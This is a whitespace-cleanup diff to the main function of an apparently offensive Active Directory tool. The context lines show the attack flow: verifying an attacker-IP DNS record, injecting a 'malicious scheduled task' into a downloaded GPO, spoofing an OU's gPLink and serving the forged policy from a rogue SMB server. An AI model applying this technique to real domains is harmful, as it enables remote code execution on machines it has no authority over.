@@ -19,7 +19,7 @@ from helpers.clean_utils            import init_save_file, save_attribute_value,
 from helpers.ldap_utils             import get_attribute, modify_attribute, update_extensionNames, ldap_check_credentials
 from helpers.scheduledtask_utils    import write_scheduled_task
 from helpers.version_utils          import update_GPT_version_number
-from helpers.ouned_smbserver        import SimpleSMBServer      
+from helpers.ouned_smbserver        import SimpleSMBServer
 
 from conf                           import bcolors, OUTPUT_DIR, GPOTypes, SMBModes
 
@@ -79,7 +79,7 @@ def main(
     ### ===================================== ###
     ### Performing arguments coherence checks ###
     ### ===================================== ###
-    try:    
+    try:
         options = configparser.ConfigParser()
         options.read(config)
 
@@ -92,7 +92,7 @@ def main(
                 if option not in options[section].keys() or not options[section][option]:
                     logger.error(f"{bcolors.FAIL}[!] The {section}>{option} option is required. It must be defined and non-empty in configuration file.")
                     raise SystemExit
-        
+
         # Assigning required options to variables
         domain = options["GENERAL"]["domain"]
         ou = options["GENERAL"]["ou"]
@@ -131,7 +131,7 @@ def main(
             ldaps = True
         else:
             ldaps = False
-        
+
         # If an LDAP hostname was defined, assign it ; else, initialize variable as None
         if "ldap_hostname" in options["LDAP"].keys() and options["LDAP"]["ldap_hostname"]:
             ldap_hostname = options["LDAP"]["ldap_hostname"]
@@ -188,7 +188,7 @@ def main(
         traceback.print_exc()
         sys.exit(1)
 
-    
+
     domain_dn = ",".join("DC={}".format(d) for d in domain.split("."))
     computer_dn = "CN=Computers," + domain_dn
     ldap_domain = f"{ldap_machine_name[:-1].lower()}.{domain}"
@@ -241,7 +241,7 @@ def main(
             logger.error(f'python3 dnstool.py -u \'{domain}\\{username}\' -p \'{password}\' -r \'{ldap_machine_name[:-1]}\' -a add -d "{attacker_ip}" "{domain}"')
             sys.exit(1)
         logger.warning(f"{bcolors.OKGREEN}[+] The DNS record {ldap_machine_name[:-1]}.{domain} exists and matches the provided attacker IP address ({attacker_ip}){bcolors.ENDC}")
-        
+
 
         ### ===================================================== ###
         ### Verifying the SMB DNS record in case of forwarded SMB ###
@@ -279,7 +279,7 @@ def main(
             if confirmation.lower() != 'yes':
                 sys.exit(1)
         '''
-        
+
         # Check if we can login to LDAP server
         if ldap_hostname is not None:
             if ldap_check_credentials(ldap_ip, f"{ldap_hostname.upper()}$" if not ldap_hostname.endswith('$') else f"{ldap_hostname.upper()}", ldap_machine_password, ldap_domain) is False:
@@ -288,7 +288,7 @@ def main(
                 if confirmation.lower() != 'yes':
                     sys.exit(1)
             logger.warning(f"{bcolors.OKGREEN}[+] Successfully authenticated to LDAP server with DC account and LDAP machine_password. LDAP and machine account passwords are synchronized.{bcolors.ENDC}")
-        
+
         # For the SMB server, only perform checks if we are in "forwarded" mode
         if smb_mode == "forwarded" and just_coerce is False:
             '''
@@ -301,7 +301,7 @@ def main(
                 smb_check_hostname = parsed[0]
             except:
                 logger.error(f"{bcolors.FAIL}[!] Could not resolve _ldap._tcp.{domain} with SMB nameserver. Are you sure the domain name of your SMB server is {domain} as expected ?{bcolors.ENDC}")
-            
+
             if smb_check_hostname is not None and smb_check_hostname != machine_name[:-1]:
                 logger.error(f"{bcolors.FAIL}[!] Resolved SMB server hostname ({smb_check_hostname}) is not {machine_name[:-1]} as expected ?{bcolors.ENDC}")
                 failure = True
@@ -358,7 +358,7 @@ def main(
         logger.critical(f"{bcolors.FAIL}[!] Failed to write malicious scheduled task to downloaded GPO. Exiting...{bcolors.ENDC}", exc_info=True)
         sys.exit(1)
     logger.warning(f"{bcolors.OKGREEN}[+] Successfully injected malicious scheduled task.{bcolors.ENDC}")
-    
+
 
     try:
         gpo_dn = 'CN={' + gpo_id + '}},CN=Policies,CN=System,{}'.format(ldap_domain_dn)
@@ -456,7 +456,7 @@ def main(
             logger.warning(f"{bcolors.OKBLUE}[+] {numEntry+1} :  {entry.entry_dn}.{bcolors.ENDC}")
             numEntry+=1
         targetEntry = input(f"{bcolors.OKBLUE}[+] Select which OU you want to target : {bcolors.ENDC}")
-        try: 
+        try:
             targetEntry = int(targetEntry)
             if(targetEntry > ldap_entries):
                 raise Exception
@@ -464,15 +464,15 @@ def main(
             logger.critical(f"{bcolors.FAIL}[!] Failed to select target OU.{bcolors.ENDC}")
             clean(ldap_session, ldap_server_session, save_file_name)
             sys.exit(1)
-        
+
         ou_dn = ldap_session.entries[targetEntry-1].entry_dn
-        logger.warning(f"{bcolors.OKGREEN}[+] The OU has been successfully targeted. - {ou_dn}.{bcolors.ENDC}") 
+        logger.warning(f"{bcolors.OKGREEN}[+] The OU has been successfully targeted. - {ou_dn}.{bcolors.ENDC}")
 
     else:
         logger.error(f"{bcolors.FAIL}[!] Could not find Organizational Unit with name {ou}.{bcolors.ENDC}")
         clean(ldap_session, ldap_server_session, save_file_name)
         sys.exit(1)
-    
+
     logger.warning(f"[*] Retrieving the initial gPLink value to prepare for cleaning.")
 
     try:
@@ -493,7 +493,7 @@ def main(
     logger.warning(f"{bcolors.OKGREEN}[+] Successfully spoofed gPLink for OU {ou_dn}{bcolors.ENDC}")
 
 
-    
+
 
     ### ======================== ###
     ### Launching GPT SMB server ###
@@ -523,7 +523,7 @@ def main(
             server.setSMBChallenge('')
             server.setLogFile('')
             server.start()
-        
+
         else:
             logger.warning(f"\n{bcolors.BOLD}=== WAITING (GPT REQUESTS WILL BE FORWARDED TO SMB SERVER) ==={bcolors.ENDC}")
             while True:
@@ -540,11 +540,11 @@ def main(
         ldap_server = Server(f'ldap://{ldap_ip}:389', port = 389, use_ssl = False)
         ldap_server_session = Connection(ldap_server, user=f"{ldap_domain}\\{ldap_username}", password=ldap_password, authentication=NTLM, auto_bind=True)
         clean(ldap_session, ldap_server_session, save_file_name)
-    
+
 
 def entrypoint():
     typer.run(main)
 
-    
+
 if __name__ == "__main__":
     typer.run(main)
